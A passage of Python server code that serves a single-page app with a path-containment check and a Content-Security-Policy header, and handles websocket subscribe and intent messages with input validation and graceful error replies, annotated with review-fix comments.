                    # has NO timeout by design (the whole point is "wait for a
                    # human, however long that takes"), so without this
                    # extension an abandoned tab's in-flight approval would hang
                    # forever, permanently locking node.pending_request_id.
                    agent_dispatcher.cancel_all_pending_approvals()

    resolved_spa = SPA_DIST_DIR if spa_dir is None else spa_dir
    if resolved_spa.is_dir():
        # html=True serves index.html at / ; the explicit fallback below keeps
        # deep links (client-side routes) working instead of 404ing.
        app.mount("/assets", StaticFiles(directory=resolved_spa / "assets"), name="assets")

        @app.get("/{full_path:path}")
        async def spa(full_path: str) -> FileResponse:
            candidate = (resolved_spa / full_path).resolve()
            if full_path and candidate.is_file() and candidate.is_relative_to(resolved_spa.resolve()):
                response = FileResponse(candidate)
            else:
                response = FileResponse(resolved_spa / "index.html")
            # SECURITY-FIX (markdown-image-exfil): see CONTENT_SECURITY_POLICY's
            # own module-level comment above for the full mechanism this closes.
            # Attached directly to the response object (this route's own two
            # FileResponse branches are the only place the SPA document itself
            # is served - unlike require_capability_token/require_loopback_origin
            # above, which gate a shared set of paths uniformly, this header only
            # ever needs to reach the document responses this handler returns).
            response.headers["Content-Security-Policy"] = CONTENT_SECURITY_POLICY
            return response
    else:
        logger.warning("SPA build not found at %s - only /api and /ws are served", resolved_spa)

    return app


async def _handle_message(session: SessionBus, websocket: WebSocket, message: dict) -> None:
    # REVIEW-FIX: websocket.receive_json() is a bare json.loads() with no
    # shape check (starlette's own implementation) - any syntactically
    # valid top-level JSON value (a bare number, a list, null, a string)
    # reaches here unchanged, and `message: dict` is only a type hint, not
    # an enforced guarantee. Every OTHER malformed-input path in this
    # function replies with a graceful `kind: error` frame instead of
    # raising; a non-dict message used to raise AttributeError on the very
    # next line ('int'/'list' object has no attribute 'get'), escaping the
    # ONE try/except around the receive loop above (which catches
    # WebSocketDisconnect only) and killing the connection outright with
    # zero client-facing feedback. Reproduced directly: calling this
    # function with 42 or [1, 2, 3] raised uncaught before this guard.
    if not isinstance(message, dict):
        await websocket.send_json(
            {"kind": "error", "id": None, "error": "malformed message: expected a JSON object"}
        )
        return

    kind = message.get("kind")
    msg_id = message.get("id")

    if kind == "subscribe":
        topics = message.get("topics") or session.topic_names()
        # REVIEW-FIX: same reasoning as the isinstance guard above, for the
        # one field this branch trusts without a shape check. A truthy
        # non-iterable "topics" (e.g. the JSON number 5) bypasses the `or`
        # fallback above and used to raise TypeError ('int' object is not
        # iterable) straight out of the `for topic in topics` loop below -
        # reproduced directly. A malformed shape here gets the same
        # graceful error reply every other bad-input path in this function
        # already uses, instead of killing the connection.
        if not isinstance(topics, list):
            await websocket.send_json(
                {"kind": "error", "id": msg_id, "error": "malformed message: 'topics' must be a list"}
            )
            return
        for topic in topics:
            # SECURITY-FIX: `topics` was checked to be a list, but not that
            # each ELEMENT is a hashable/string topic name. A subscribe frame
            # like {"topics": [{}]} passed the list check and reached
            # send_snapshot -> self._topics.get(topic), which raised
            # TypeError('unhashable type: dict') - not UnknownTopicError, so
            # it escaped the except clause below uncaught and killed the
            # connection, the exact "malformed input drops the socket"
            # failure this function's own adjacent REVIEW-FIXes all close.
            if not isinstance(topic, str):
                await websocket.send_json(
                    {"kind": "error", "id": msg_id, "error": "malformed message: each topic must be a string"}
                )
                continue
            try:
                await session.send_snapshot(topic, websocket, request_id=msg_id)
            except UnknownTopicError:
                await websocket.send_json(
                    {"kind": "error", "id": msg_id, "error": f"unknown topic: {topic}"}
                )
        return

    if kind == "intent":
        topic = message.get("topic", "")
        intent = message.get("intent", "")
        args = message.get("args") or []
        try:
            result = await session.dispatch_intent(topic, intent, args)
        except UnknownTopicError as exc:
            # ADR-003 stage 3.1 review-fix: UnknownTopicError/UnknownIntentError
            # both subclass KeyError, whose __str__ wraps a single-arg message
            # in repr() (e.g. "'scene'" with literal quotes) - this error text
            # now reaches end users via fireIntent()'s notification banner, not
            # just a developer console, so exc.args[0] is used directly instead
            # of str(exc) to avoid that raw repr artifact leaking through.
            await websocket.send_json(
                {"kind": "error", "id": msg_id, "error": f"Unknown topic: {exc.args[0]}."}
            )
            return
        except UnknownIntentError as exc:
            await websocket.send_json(
                {"kind": "error", "id": msg_id, "error": f"Unknown intent: {exc.args[0]}."}
            )
            return
        except IntentValidationError as exc:
            # ADR-003 stage 3.2: a schema-validated intent's args failed
            # BEFORE dispatch_intent ever called the handler - exc.errors are
            # already clean, human-readable strings (validate_payload's own
            # output, not a raw exception repr), so they're joined directly
            # rather than routed through the generic catch-all below.
            await websocket.send_json(
                {
                    "kind": "error",
                    "id": msg_id,
                    "error": f"Invalid arguments: {'; '.join(exc.errors)}.",
                }
            )
            return
        except Exception:
            # Handler bugs surface as errors to the caller, never as a dropped
            # socket - and always land in the log (full topic/intent/traceback
            # detail is here, not repeated in the user-facing message below).
            logger.exception("intent %s/%s failed", topic, intent)
            await websocket.send_json(
                {
                    "kind": "error",
                    "id": msg_id,
                    "error": "Something went wrong while handling this request.",
                }
            )
            return
        if msg_id is not None:
            await websocket.send_json({"kind": "result", "id": msg_id, "value": result})
        return

    await websocket.send_json(
        {"kind": "error", "id": msg_id, "error": f"unknown message kind: {kind!r}"}
    )
